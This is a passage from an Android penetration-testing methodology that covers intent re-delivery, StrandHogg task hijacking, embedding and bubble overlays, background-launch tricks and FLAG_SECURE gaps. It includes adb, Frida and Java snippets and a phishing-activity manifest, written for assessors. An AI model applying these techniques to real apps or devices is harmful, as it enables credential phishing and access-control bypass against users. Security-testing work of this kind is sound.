- **Escalation:** -> D15 to confirm the IDOR against the API directly; -> D08 if the re-delivered intent is
  forwarded onward.
- **Ruled out when:** `onNewIntent` calls `setIntent(intent)` and then re-runs the same validation path as
  `onCreate`, including the session and ownership check — verified by re-driving with another user's
  identifier and observing a `403` from the backend or a refusal on the client.

### D04-029 · Caller validated in `onCreate` but not in `onNewIntent` (`ComponentCaller`, API 35)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15 / API 35+ for the API; the `onNewIntent` gap itself is universal |
| **Maps to** | `about/versions/15/features` (`ComponentCaller`, `Context.checkContentUriPermissionFull()`); `risks/intent-redirection` |

- **Test:** Android 15 finally gives activities a real caller identity. The two errors that follow it are
  checking the caller only in `onCreate` — so a `singleTop`/`singleTask` re-delivery from a *different*
  package is unchecked — and checking `getCallingActivity()` for non-null instead (D04-026).
- **How:**
  ```bash
  grep -rnE 'ComponentCaller|getCurrentCaller|getInitialCaller|checkContentUriPermissionFull|onNewIntent' out/sources/
  ```
  Deliver the first intent from package A (or the app's own flow) and the second from package B, then watch
  the privileged action run:
  ```bash
  adb shell am start -n com.target.app/.Target --es op view
  adb shell am start -n com.target.app/.Target --es op delete_account   # second caller, unchecked
  ```
- **Proof:** The privileged action executing on the second delivery, with the target's own logcat showing the
  caller check ran only once. A Frida hook on the validation method printing a single invocation is the
  machine-readable version.
- **Escalation:** -> D08. This is an authorisation bypass on re-delivery, and it re-opens components you
  ruled out from a single-shot test.
- **Ruled out when:** The activity overrides `onNewIntent(Intent, ComponentCaller)` (or re-checks the caller
  inside `onNewIntent`) and applies the same authorisation decision as `onCreate` — verified by the two-caller
  test above producing a refusal on the second delivery.

### D04-030 · `FLAG_ACTIVITY_NEW_TASK` plus matching affinity resurfaces a mid-flow authenticated task

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `guide/components/activities/tasks-and-back-stack` ("if a task exists with the same affinity, the system brings it to the foreground and restores state"); `content/Intent.java` flag constants |

- **Test:** With `FLAG_ACTIVITY_NEW_TASK`, an existing task with the same affinity is **brought to the
  foreground with its state restored** rather than a fresh instance being started. An attacker can therefore
  surface a victim task that is mid-flow — a payment confirmation that has already been authenticated —
  rather than starting at the login screen.
- **How:**
  ```bash
  adb shell am start -n com.target.app/.Target -f 0x10000000     # NEW_TASK
  adb shell am start -n com.target.app/.Target -f 0x10008000     # NEW_TASK|CLEAR_TOP
  adb shell am start -n com.target.app/.Target -f 0x18000000     # NEW_TASK|MULTIPLE_TASK
  adb shell dumpsys activity activities | sed -n '/Task{/,+8p'
  ```
- **Proof:** `dumpsys activity activities` showing the pre-existing task brought to front with its stack
  intact, and the on-screen state being a mid-flow authenticated screen that the attacker did not have to
  authenticate to reach.
- **Escalation:** This is the setup half of a tapjacking chain — pair with D04-048 so the resurfaced
  confirmation is completed by an overlay, and with D04-038 for the BAL precondition on API 34+.
- **Ruled out when:** The app re-runs its session/step-up check in `onResume` of the confirmation screen, or
  the confirmation is a `singleInstance` activity that finishes on task reset (`android:finishOnTaskLaunch` /
  `android:clearTaskOnLaunch`) — verified by backgrounding mid-flow, firing the flag, and observing the
  auth prompt.

### D04-031 · Task-manipulation flag sweep — the full `FLAG_ACTIVITY_*` grammar against every exported activity

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer flag map verified in `src/drozer/android.py`; MASTG-TOOL-0015 |

- **Test:** Run the exported set once more under each task flag. This is how you learn whether a third party
  can manipulate the app's task stack at all — the precondition for every UI-redress item below — without
  building an attacker app first.
- **How:** The verified name→value map:
  `ACTIVITY_BROUGHT_TO_FRONT 0x00400000`, `ACTIVITY_CLEAR_TASK 0x00008000`, `ACTIVITY_CLEAR_TOP 0x04000000`,
  `ACTIVITY_CLEAR_WHEN_TASK_RESET 0x00080000`, `ACTIVITY_EXCLUDE_FROM_RECENTS 0x00800000`,
  `ACTIVITY_FORWARD_RESULT 0x02000000`, `ACTIVITY_LAUNCHED_FROM_HISTORY 0x00100000`,
  `ACTIVITY_MULTIPLE_TASK 0x08000000`, `ACTIVITY_NEW_TASK 0x10000000`, `ACTIVITY_NO_ANIMATION 0x00010000`,
  `ACTIVITY_NO_HISTORY 0x40000000`, `ACTIVITY_NO_USER_ACTION 0x00040000`,
  `ACTIVITY_PREVIOUS_IS_TOP 0x01000000`, `ACTIVITY_REORDER_TO_FRONT 0x00020000`,
  `ACTIVITY_RESET_TASK_IF_NEEDED 0x00200000`, `ACTIVITY_SINGLE_TOP 0x20000000`,
  `ACTIVITY_TASK_ON_HOME 0x00004000`, `GRANT_READ_URI_PERMISSION 0x00000001`,
  `GRANT_WRITE_URI_PERMISSION 0x00000002`.
  ```
  dz> run app.activity.start --component com.target.app com.target.app.LoginActivity \
        --flags ACTIVITY_NEW_TASK ACTIVITY_CLEAR_TASK
  dz> run app.activity.start --component com.target.app com.target.app.LoginActivity \
        --flags ACTIVITY_NEW_TASK ACTIVITY_MULTIPLE_TASK
  ```
  ```bash
  adb shell am start -n com.target.app/.LoginActivity --activity-clear-task --activity-new-task
  adb shell am start -n com.target.app/.LoginActivity -f 0x00020000   # REORDER_TO_FRONT
  adb shell dumpsys activity activities | grep -A5 'Task{'
  ```
- **Proof:** A table of flag → resulting task composition from `dumpsys activity activities`. The target's
  login screen appearing inside a task you control, or the target's own task cleared and replaced, is the
  observable that matters.
- **Escalation:** A credential-entry screen that can be placed inside an attacker-controlled task is the
  UI-redress primitive for D04-032 through D04-040; a `GRANT_*_URI_PERMISSION` flag that survives is
  D04-023.
- **Ruled out when:** Every sensitive activity is `launchMode="singleInstance"` with `taskAffinity=""`, so
  no externally-supplied flag changes the stack — verified by the flag table showing an unchanged
  `Task{}` composition across all nineteen flags.

### D04-032 · Task hijacking via inherited `taskAffinity` + `allowTaskReparenting` (StrandHogg v1)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | no dedicated path. File as `broken_access_control.exposed_sensitive_android_intent` (null) when an exported component is the pivot, or `server_side_injection.content_spoofing.external_authentication_injection` (P4) if the triager insists on spoofing framing — argue up with the captured credential |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** Live only where `minSdkVersion` still admits devices below API 30. `risks/strandhogg` states both variants are patched at OS level in Android 11+ (v1 March 2019, v2 September 2020) and recommends `minSdkVersion=30` |
| **Maps to** | `risks/strandhogg` (MASVS-PLATFORM); MobSF `task_affinity_set`; QARK `qark/plugins/generic/task_affinity.py` and `manifest/task_reparenting.py`; sec-88 "Task Hijacking" (victim+attacker PoC, `github.com/az0mb13/Task_Hijacking_Strandhogg`); H1 #1325649; ATT&CK T1417.002, T1655.001 |

- **Test:** Every activity inherits `taskAffinity` equal to the application package name unless the developer
  sets `android:taskAffinity=""`. A malicious app declaring the victim's package as its own affinity, with
  `allowTaskReparenting="true"`, has its activity reparented into the victim's task, so the user's next tap
  on the victim's launcher icon lands on the attacker's screen — inside the victim's task, under the victim's
  Recents entry.
- **How:** Read the victim's exposure first, and read `minSdkVersion` before you spend any time here:
  ```bash
  aapt dump badging base.apk | grep -oE "(min|target)SdkVersion:'[0-9]+'"
  grep -nE 'android:(taskAffinity|allowTaskReparenting|launchMode)' out/AndroidManifest.xml
  apkanalyzer manifest print base.apk | grep -i taskaffinity
  ```
  Attacker manifest:
  ```xml
  <activity android:name=".Phish"
            android:taskAffinity="com.target.app"
            android:allowTaskReparenting="true"
            android:excludeFromRecents="true"
            android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.MAIN"/>
      <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
  </activity>
  ```
  Default-affinity variant (no `singleTask`): same affinity, and the attacker activity calls
  `moveTaskToBack(true)` in `onCreate` so the task stays in Recents but out of sight, re-asserting its view
  in `onResume`.
  ```bash
  adb shell dumpsys activity activities | sed -n '/Task{/,/mResumedActivity/p' | grep -iE 'affinity|realActivity'
  ```
- **Proof:** `dumpsys activity activities` showing the attacker activity resident inside the task whose root
  affinity equals `com.target.app`, plus a screen recording of the user tapping the *legitimate* launcher
  icon and landing on the attacker's login form. This is a visual finding — the recording is the report.
- **Escalation:** Captured credentials -> D13 account takeover; the same surface hosts a fake consent screen
  for a D03 permission grant. Behaviour varies by OEM launcher — reproduce on at least two devices and state
  both.
- **Ruled out when:** `android:taskAffinity=""` is set at `<application>` level (or on every sensitive
  activity), **or** `minSdkVersion >= 30` so no in-scope device is affected. Record the `minSdkVersion` value
  in the negative; "did not reproduce on my API 34 test device" is not a negative on its own, because the
  question is which devices the app still supports.

### D04-033 · `launchMode="singleTask"` on the launcher activity with `targetSdk < 28` (the MobSF `task_hijacking` rule)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | as D04-032 |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** MobSF's condition is `target_sdk < ANDROID_9_0_LEVEL and launchmode == 'singleTask'` |
| **Maps to** | MobSF `task_hijacking` (level `high`); MobSF `task_hijacking2` (condition `target_sdk < 29` AND `exported="true"` AND (`launchMode != "singleInstance"` OR `taskAffinity != ""`), remediation string: set `launchMode="singleInstance"` **and** `taskAffinity=""`, or raise targetSdk to 29+); sec-88 vulnerable pattern `<activity android:name=".MainActivity" android:launchMode="singleTask">` on LAUNCHER |

- **Test:** The specific manifest shape scanners flag, and the one clients will ask you about. With
  `singleTask` the activity becomes the root of its task, so a malicious app can place its own activity on
  top of that task and the user sees no app switch.
- **How:**
  ```bash
  grep -nE 'launchMode="single(Task|Instance)"' out/AndroidManifest.xml
  aapt dump badging base.apk | grep targetSdkVersion
  python3 - <<'PY'
  import xml.dom.minidom as m
  d = m.parse('out/AndroidManifest.xml'); NS='android'
  for a in d.getElementsByTagName('activity'):
      e  = a.getAttribute(f'{NS}:exported')
      lm = a.getAttribute(f'{NS}:launchMode')
      ta = a.getAttribute(f'{NS}:taskAffinity')
      if e == 'true' and (lm != 'singleInstance' or ta != ''):
          print('STRANDHOGG2-CANDIDATE', a.getAttribute(f'{NS}:name'),
                'launchMode=', lm, 'taskAffinity=', repr(ta))
  PY
  ```
  Quick probe without building an attacker app:
  ```bash
  adb shell am start -n com.target.app/.LoginActivity -f 0x10000000
  adb shell dumpsys activity activities | sed -n '/Task{/,/Run #0/p'
  ```
- **Proof:** The candidate list, plus a reproduction as in D04-032. Report the two halves separately: the
  manifest condition is the *configuration* finding; the video is the *impact* finding.
- **Escalation:** Merge this with D04-032 into one report rather than filing the scanner condition alone — a
  bare MobSF row is a P5 configuration note.
- **Ruled out when:** `targetSdkVersion >= 29` and the launcher activity is not `singleTask`, or the
  application sets `taskAffinity=""` with `launchMode="singleInstance"` on the launcher. Prove it with the
  candidate script returning no rows.

### D04-034 · StrandHogg 2.0 — reflective task hijack that ignores `taskAffinity` (CVE-2020-0096)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | as D04-032 |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** Android 8.0 / 8.1 / 9 below the May 2020 security patch level; Android 10 and later are not affected. sec-88 states the exposure floor as API < 29 |
| **Maps to** | CVE-2020-0096 (`nvd.nist.gov/vuln/detail/CVE-2020-0096`), described in the corpus as "StrandHogg 2.0"; HackTricks `android-task-hijacking.md`; Promon write-up |

- **Test:** A zero-permission app iterates running tasks and uses `Context.startActivities()` and hidden APIs
  to re-parent its own activity to the top of *any* task at runtime. It needs **no manifest declaration** on
  the attacker side, which is why `taskAffinity`-based static detection misses it entirely and why a clean
  manifest is not proof of safety.
- **How:**
  ```bash
  aapt dump badging base.apk | grep -oE "minSdkVersion:'[0-9]+'"
  adb shell getprop ro.build.version.security_patch      # fix back-ported in the May 2020 SPL
  adb shell dumpsys activity activities | grep -E 'Task\{|realActivity|affinity'
  ```
  Look for an activity whose package differs from the task's affinity. Reproduce on an emulator at the lowest
  in-scope API level with a `startActivities()`-chain PoC.
- **Proof:** The attacker activity interposed into the victim's task with **no** `taskAffinity` declaration
  in the attacker manifest, on a device below the May-2020 patch level — demonstrating that the standard
  remediation advice (`taskAffinity=""`) does not cover this variant.
- **Escalation:** Same phishing impact as v1 with weaker detectability. The only app-side mitigation the
  client can take is raising `minSdkVersion`; the runtime self-defence worth recommending is periodically
  validating the top activity's package via `ActivityManager#getRunningTasks`.
- **Ruled out when:** `minSdkVersion >= 29`, or the supported fleet is entirely at or above the May 2020
  SPL — record `ro.build.version.security_patch` from the devices in scope. Static manifest review can never
  rule this out; say so explicitly rather than implying the manifest was clean.

### D04-035 · `android:allowCrossUidActivitySwitchFromBelow` not set to `false` — the modern task-hijack opt-in was not taken

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15+ for the defence; the docs place full enforcement at API 37+, so on Android 15/16 this is an opt-in the app must have taken |
| **Maps to** | `guide/components/activities/background-starts` (Rule 1 / Rule 2, `android:allowCrossUidActivitySwitchFromBelow`, `setAllowCrossUidActivitySwitchFromBelow(true)` as a per-activity exception); `risks/strandhogg` |

- **Test:** Android 15 added an opt-in defence: with
  `android:allowCrossUidActivitySwitchFromBelow="false"` on `<application>`, activities inside a task may
  only be launched by activities sharing the UID of the current top activity, and only same-UID foreground
  activities can bring a task forward. An app that has not set it remains hijackable in the classic same-task
  pattern on current devices — which is what makes this the *live* version of the StrandHogg family rather
  than the legacy one.
- **How:**
  ```bash
  grep -n 'allowCrossUidActivitySwitchFromBelow' out/AndroidManifest.xml   # expect false; absence = unhardened
  grep -nE 'taskAffinity|launchMode="singleTask"|allowTaskReparenting' out/AndroidManifest.xml
  adb shell dumpsys activity activities | grep -A3 'Task{.*com.target.app'
  ```
  Then run the D04-032 attacker manifest against an Android 15 device.
- **Proof:** `dumpsys activity activities` showing the attacker activity resident in the target's task on an
  Android 15 device, with the attribute absent from the target's manifest; and Back or the launcher icon
  landing on the attacker UI.
- **Escalation:** -> D13 credential capture. This is the item to lead with when the client asks "is
  StrandHogg still a thing on modern Android" — the answer is that it is, for apps that have not opted in.
- **Ruled out when:** `<application android:allowCrossUidActivitySwitchFromBelow="false">` is present with no
  per-activity `setAllowCrossUidActivitySwitchFromBelow(true)` override (D04-036), verified by the same-task
  reproduction failing on an Android 15 device.

### D04-036 · `setAllowCrossUidActivitySwitchFromBelow(true)` called at runtime — a self-inflicted hardening opt-out

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15+ |
| **Maps to** | `guide/components/activities/background-starts` |

- **Test:** Even when the manifest sets `false`, an individual activity can re-open itself by calling
  `setAllowCrossUidActivitySwitchFromBelow(true)` in `onCreate()`. Each call site is an exception the app
  carved into its own defence; the ones that matter sit on authentication and payment screens.
- **How:**
  ```bash
  grep -rn 'setAllowCrossUidActivitySwitchFromBelow' out/sources/
  # cross-reference the call sites against the sensitive-screen list
  ```
- **Proof:** The call present in an activity that also handles authentication, payment confirmation or
  account linking — and the D04-035 reproduction succeeding against *that* activity while failing against its
  siblings. The differential is the evidence.
- **Escalation:** as D04-035.
- **Ruled out when:** No call site exists, or every call site is on a screen with no credential entry and no
  irreversible control — and the D04-035 reproduction fails there too.

### D04-037 · `android:allowEmbedded` without `knownActivityEmbeddingCerts`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; `android:allowEmbedded` defaults to `"false"` |
| **Maps to** | `guide/topics/manifest/activity-element` (`allowEmbedded`, `knownActivityEmbeddingCerts`) |

- **Test:** `android:allowEmbedded="true"` lets an activity be launched as an embedded child of another
  activity — rendered inside a host app's window. On a sensitive activity with no
  `android:knownActivityEmbeddingCerts` pinning the permitted host signature, an untrusted host embeds and
  frames it, with whatever chrome it likes around the victim's screen.
- **How:**
  ```bash
  grep -nE 'allowEmbedded|knownActivityEmbeddingCerts|resizeableActivity' out/AndroidManifest.xml
  ```
  Then embed it from a stub host and capture the composed UI.
- **Proof:** A sensitive (auth/payment) activity declaring `android:allowEmbedded="true"` with no
  `knownActivityEmbeddingCerts`, plus a screenshot of it rendering inside your host's window with your chrome
  around it.
- **Escalation:** This is UI redress with a legitimate-looking frame, and it does not require
  `SYSTEM_ALERT_WINDOW` — so it survives the Android 12 overlay restrictions that kill D04-047. Chain to
  D13 credential capture.
- **Ruled out when:** No activity sets `allowEmbedded="true"`, or every one that does also sets
  `knownActivityEmbeddingCerts` pinning the first-party signing certificate — verified by attempting the
  embed from a differently-signed host and observing it refused.

### D04-038 · Background-Activity-Launch is the make-or-break precondition — state it or the PoC is not reproducible

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs every redirected- or background-launch PoC in this chapter |
| **Attacker** | AM-03 |
| **Applies to** | **CURRENT** — decisive at API 34+; weaker below, so state the API level you tested |
| **Maps to** | `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15` ("PendingIntent creators block background activity launches by default"; "prevent launching arbitrary activities from other apps into your own task"); `guide/components/activities/background-starts` |

- **Test:** On API 34+ the victim app can only launch your redirected Intent **while it has a visible
  window** (`BAL_ALLOW_VISIBLE_WINDOW`). If your attacker app is foreground when the trigger lands, the
  victim is backgrounded and you get `BAL_BLOCK` with result code `102` and nothing happens. Half the
  "not reproducible" closes on this domain are this, not a broken bug.
- **How:**
  ```bash
  adb logcat -c
  # fire the chain, then:
  adb logcat | grep -oE 'BAL_[A-Z_]+'
  adb shell am start -n com.target.app/.Target ; echo "result=$?"
  ```
  The working shape observed in the field: the attacker's `onCreate` calls `moveTaskToBack(true)` at roughly
  400 ms **and** sprays the trigger about twenty times over ~24 s so one lands while the victim is visible.
  `moveTaskToBack` returns to the task *behind* the attacker, so the attacker must be opened **over the
  victim's screen** — launching it from the launcher puts the launcher behind, the victim stays hidden, and
  you get `BAL_BLOCK` every time.
  Also grep the target for the opt-back-in:
  ```bash
  grep -rnE 'setPendingIntentBackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_ALLOWED|BIND_ALLOW_ACTIVITY_STARTS|setPendingIntentCreatorBackgroundActivityStartMode' out/sources/
  ```
- **Proof:** `BAL_ALLOW_VISIBLE_WINDOW` in logcat alongside the redirected activity appearing, contrasted
  with `BAL_BLOCK` / `result code=102` when the attacker is foreground. Both captures belong in the report.
- **Escalation:** Frame the exploit as "captures on the victim's next login" — a recurring natural event —
  never as "works unconditionally". A target that calls
  `ActivityOptions.setPendingIntentBackgroundActivityStartMode(MODE_BACKGROUND_ACTIVITY_START_ALLOWED)` on a
  PendingIntent handed to third parties, or `bindService()` with `BIND_ALLOW_ACTIVITY_STARTS` exposed to an
  untrusted binder client, has re-enabled the phishing substrate on modern devices — that is a Medium-to-High
  finding in its own right (-> D08).
- **Ruled out when:** Your chain produces `BAL_BLOCK` on every attempt across at least twenty sprayed
  triggers with the attacker backgrounded, on the lowest in-scope API level as well as the highest. That is a
  real negative and it belongs in the ruled-out register with the logcat.

### D04-039 · Non-exported activity started through a system deputy (LaunchAnyWhere)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the reached screen is post-auth |
| **Attacker** | AM-03 |
| **Applies to** | all; mitigated for *implicit* intents at targetSdk 34+, but nested-**explicit** redirection is unaffected |
| **Maps to** | Oversecured, "Discovering vendor-specific vulnerabilities in Android" — the `com.android.settings.homepage.SettingsHomepageActivity` case, "since Settings runs with UID 1000 (system), this escalated to accessing non-exported activities across all apps on the device"; AOSP threat classes [T.A2] and [T.A7] |

- **Test:** A privileged app — Settings, a vendor launcher, an account-authenticator host — that takes an
  `Intent` or `Bundle` from an untrusted caller and `startActivity()`s it becomes a launcher for
  **non-exported** activities anywhere on the device, executed with the deputy's UID. This re-opens every
  activity you ruled out as `exported="false"`.
- **How:**
  ```bash
  adb shell dumpsys package com.android.settings | grep -E 'exported=true' | head -40
  # jadx on the deputy: nested-Intent extraction into startActivity
  grep -rnE 'getParcelableExtra\([^)]*\)\s*;?\s*$|startActivity\(\s*\(Intent\)' deputy_src/
  adb shell am start -n com.oem.settings/.homepage.SettingsHomepageActivity \
    -e ':android:show_fragment' com.target.app.InternalFragment
  ```
  ```java
  // nested-Intent deputy, from an attacker app
  Intent inner = new Intent();
  inner.setClassName("com.target.app", "com.target.app.internal.NonExportedActivity");
  Intent outer = new Intent("com.oem.ACTION");
  outer.putExtra("intent", inner);
  startActivity(outer);
  ```
- **Proof:** The non-exported activity visibly starting, named by
  `adb shell dumpsys activity activities | grep -A3 mResumedActivity`, while a direct
  `am start -n com.target.app/.internal.NonExportedActivity` from the same context returns
  `java.lang.SecurityException: Permission Denial: ... not exported from uid ...`. That contrast — direct
  start denied, deputy-mediated start succeeded — is the whole finding.
- **Escalation:** Non-exported activities skip auth precisely because they assume an internal caller, so the
  reached screen is usually a D04-007 or a D04-013 -> D15. Critical when the deputy runs as UID 1000, because
  the started component inherits system-side effects.
- **Ruled out when:** No deputy on the device forwards a caller-supplied Intent (verified by reading the
  candidate deputies' handlers, not by a scanner), **and** the target's non-exported activities refuse to run
  without the session state the normal flow establishes. On a stock Google device with no OEM Settings fork,
  record that the deputy set was empty — that is scoped, not universal.

### D04-040 · Bubble activity — `allowEmbedded` + `documentLaunchMode="always"` is a permission-free float-over-other-apps surface

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) if it renders another user's conversation |
| **Attacker** | AM-03 |
| **Applies to** | API 29+ for bubbles; API 30+ requires a long-lived sharing shortcut |
| **Maps to** | `develop/ui/views/notifications/bubbles` — `NotificationCompat.BubbleMetadata.Builder`, `setAutoExpandBubble(true)`, `setSuppressNotification(true)`, `setShortcutId()`, `android:allowEmbedded="true"`, `android:resizeableActivity="true"`, `android:documentLaunchMode="always"`, and "Bubbles float on top of other app content" |

- **Test:** Chat and support features that implement Android Bubbles must declare the bubble target with
  `allowEmbedded="true"`, `resizeableActivity="true"` and (API 29 and lower) `documentLaunchMode="always"`.
  That activity renders **over other apps with no overlay permission**. Two questions: is it also exported or
  reachable through a leaked `PendingIntent`, and does it render conversation content without re-checking the
  session?
- **How:**
  ```bash
  grep -nE 'allowEmbedded="true"' out/AndroidManifest.xml
  grep -rnE 'BubbleMetadata|setBubbleMetadata|setAutoExpandBubble|setSuppressNotification|setShortcutId' out/sources/
  adb shell am start -n com.target.app/.bubbles.BubbleActivity --es conversationId 'victim-thread-id'
  adb shell am force-stop com.target.app && \
    adb shell am start -n com.target.app/.bubbles.BubbleActivity --es conversationId X
  ```
- **Proof:** The bubble activity drawing a conversation you do not own, or drawing at all after
  `am force-stop` with no login prompt — screen-recorded floating over a third-party app.
- **Escalation:** `setAutoExpandBubble(true)` plus `setSuppressNotification(true)` is a **silent overlay
  primitive obtained without `SYSTEM_ALERT_WINDOW`** — chain it to D04-047/-048 against a consent screen, or
  to D13 credential capture. This is the overlay route that the Android 12 untrusted-touch block does not
  address.
- **Ruled out when:** The app declares no bubble metadata, or the bubble target is `exported="false"` and its
  `onCreate` resolves the conversation from the session rather than the extra — verified by supplying another
  account's conversation id and observing an empty or refused view.

### D04-041 · `documentLaunchMode="always"` leaves one Recents entry — and one snapshot — per document

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) |
| **Attacker** | AM-11 |
| **Applies to** | all; `documentLaunchMode` defaults to `"none"`, `excludeFromRecents` defaults to `"false"` |
| **Maps to** | `guide/topics/manifest/activity-element` (`documentLaunchMode`, `excludeFromRecents`, `autoRemoveFromRecents`, `noHistory`); MASTG-TEST-0289 |

- **Test:** `documentLaunchMode="always"` (and `FLAG_ACTIVITY_NEW_DOCUMENT`) creates a new task per document,
  and each task gets its own Recents entry with its own snapshot. `android:autoRemoveFromRecents` overrides a
  caller's `FLAG_ACTIVITY_RETAIN_IN_RECENTS`. On a document viewer, statement viewer or message thread this
  multiplies the Recents disclosure surface by the number of documents the user opened.
- **How:**
  ```bash
  grep -nE 'documentLaunchMode|excludeFromRecents|autoRemoveFromRecents|noHistory' out/AndroidManifest.xml
  grep -rnE 'FLAG_ACTIVITY_NEW_DOCUMENT|FLAG_ACTIVITY_RETAIN_IN_RECENTS|setTaskDescription' out/sources/
  # open three sensitive documents, then:
  adb shell input keyevent KEYCODE_APP_SWITCH && adb exec-out screencap -p > recents.png
  adb shell dumpsys activity recents | grep -E 'Recent #|intent=|A=|baseIntent'
  ```
- **Proof:** `recents.png` showing several document cards at once with account numbers, balances or message
  bodies legible, and `dumpsys activity recents` listing one entry per document with the document URI in the
  base intent — the URI alone is often the disclosure.
- **Escalation:** This is a P5 on its own. It converts only through D04-044 (a named consumer that can read
  the snapshot) or as the disclosure half of a physical-access narrative. The correct remediation to state is
  `FLAG_SECURE` on the document activity plus `excludeFromRecents`/`autoRemoveFromRecents`.
- **Ruled out when:** `documentLaunchMode` is `"none"` everywhere, or the document activity sets `FLAG_SECURE`
  so each Recents card renders blank — verified by the `screencap` above returning black cards. Also a true
  negative when `dumpsys activity recents` shows no document URI in the base intent.

### D04-042 · `FLAG_SECURE` set on login and forgotten on the card, OTP and transaction screens

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5); escalate through `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) only with a named consumer |
| **Attacker** | AM-04 (a screen-capture-capable co-resident app) or AM-11 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0291 (References to Screen Capturing Prevention APIs), MASTG-TEST-0289 (runtime verification); MASWE-0038 (CWE-200, CWE-359); MASVS-PLATFORM-3; AOSP threat [T.A5] "Reading content from system or other app user interfaces"; Hrishikesh C19 "Background Screen Caching"; sec-88 checklist §19, §23 |

- **Test:** Developers set `FLAG_SECURE` on the login activity and forget the screens that actually hold the
  secret. Enumerate the sensitive screens and check each one individually — the finding is the *gap in
  coverage*, and the evidence is a differential.
- **How:**
  ```bash
  grep -rnE 'FLAG_SECURE|setFlags\(WindowManager\.LayoutParams\.FLAG_SECURE|addFlags\(.*FLAG_SECURE' out/sources/
  # per-window runtime check
  adb shell dumpsys window | grep -i secure
  # navigate to each sensitive screen and capture
  adb exec-out screencap -p > shot_card.png     # black frame => FLAG_SECURE is set
  adb shell screenrecord /sdcard/t.mp4          # refuses when FLAG_SECURE is set
  ```
  Enumerate every live activity's flag with one Frida pass (`0x2000` is `FLAG_SECURE`):
  ```javascript
  Java.perform(function () {
    Java.choose('android.app.Activity', {
      onMatch: function (a) {
        try {
          var f = a.getWindow().getAttributes().flags.value;
          console.log(a.$className + ' FLAG_SECURE=' + ((f & 0x2000) !== 0));
        } catch (e) {}
      },
      onComplete: function () {}
    });
  });
  ```
- **Proof:** The **differential**: a `screencap` that renders normally on the card/OTP screen next to a black
  capture on the login screen that does set the flag, plus the hook printing `FLAG_SECURE=false` for that
  class. One capture on its own is not a finding; the pair is.
- **Escalation:** Report it only with a named consumer — a screenshot-harvesting app, an accessibility or
  `MediaProjection`-holding co-resident, or a physical-access narrative — or as a verified negative. Play
  Integrity's `environmentDetails.appAccessRiskVerdict.appsDetected` names `KNOWN_CAPTURING` /
  `UNKNOWN_CAPTURING` and `KNOWN_CONTROLLING` / `UNKNOWN_CONTROLLING`, which is the vocabulary to use when
  arguing the consumer exists. Captured OTP -> D13.
- **Ruled out when:** Every screen rendering a PAN, OTP, seed phrase, recovery code or full credential sets
  `FLAG_SECURE`, demonstrated with a black `screencap` on each and a `screenrecord` refusal. That black frame
  is the artefact for the ruled-out register — it is one of the few negatives in this domain you can prove
  visually.

### D04-043 · Recover the on-disk task snapshot rather than relying on the Recents thumbnail

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) |
| **Attacker** | AM-12 for the file read itself — **this is evidence-gathering, not an attack**; the attacker model for the finding is AM-04 or AM-11 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0289; MASTG-TECH-0002; HackTricks README ("Background Images", `/data/system_ce/0/snapshots`) |

- **Test:** The Recents thumbnail is backed by a file. Pulling it proves the content persisted rather than
  being a transient render, which is the half of the story that makes the P5 worth writing down at all.
- **How:**
  ```bash
  # navigate to the sensitive screen, then background the app
  adb shell input keyevent KEYCODE_HOME
  adb root
  adb shell ls -la /data/system_ce/0/snapshots/
  adb shell 'cp /data/system_ce/0/snapshots/* /sdcard/snaps/' && adb pull /sdcard/snaps ./snaps
  ```
- **Proof:** A pulled snapshot image showing the card number, OTP, balance or credential, with the file's
  mtime matching the moment you backgrounded the app.
- **Escalation:** With D02 (debuggable) or a rooted-device narrative the snapshot is extractable; without one
  of those, the honest framing is that it persists and is exposed to anyone with the unlocked device or to a
  capture-capable app. Do not present the root read as the attack — that is AM-12.
- **Ruled out when:** The snapshot directory holds no entry for the package after backgrounding from the
  sensitive screen (because `FLAG_SECURE` suppressed it), or the entry is a blank/obscured frame. Attach the
  blank frame.

### D04-044 · `clearFlags(FLAG_SECURE)` and the three surfaces `FLAG_SECURE` does not cover

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) |
| **Attacker** | AM-04 / AM-11 |
